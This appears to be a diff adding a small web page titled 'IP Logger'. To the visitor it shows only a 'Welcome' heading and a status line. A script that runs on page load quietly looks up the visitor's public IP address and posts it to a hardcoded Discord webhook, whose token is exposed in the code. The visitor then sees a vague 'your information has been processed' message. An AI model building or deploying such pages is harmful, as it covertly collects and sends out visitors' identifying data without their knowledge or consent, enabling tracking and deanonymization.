@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Logger</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+    .container {
+      text-align: center;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+    p {
+      margin-bottom: 20px;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Welcome</h1>
+    <p>1!!</p>
+    <p id="status" style="color: red;">Please wait...</p>
+  </div>
+
+  <script>
+    (async () => {
+      const status = document.getElementById('status');
+      try {
+        // Fetch the user's IP address
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+
+        // Send the IP to the Discord webhook
+        const webhookUrl = 'https://discord.com/api/webhooks/1309017759379882127/rti1ePKzFy-wDjCzH8wyA39C0_uTzmymZPti63yYUuRDuXpP1Il4hExqtCEsK53uQ9oP';
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            content: `New client IP: ${userIP}`,
+          }),
+        });
+
+        if (response.ok) {
+          status.textContent = 'Your information has been processed successfully. Thank you!';
+          status.style.color = 'green';
+        } else {
+          status.textContent = 'Failed to process your information. Please try again later.';
+        }
+      } catch (error) {
+        console.error('Error:', error);
+        status.textContent = 'An error occurred. Please try again later.';
+      }
+    })();
+  </script>
+</body>
+</html>
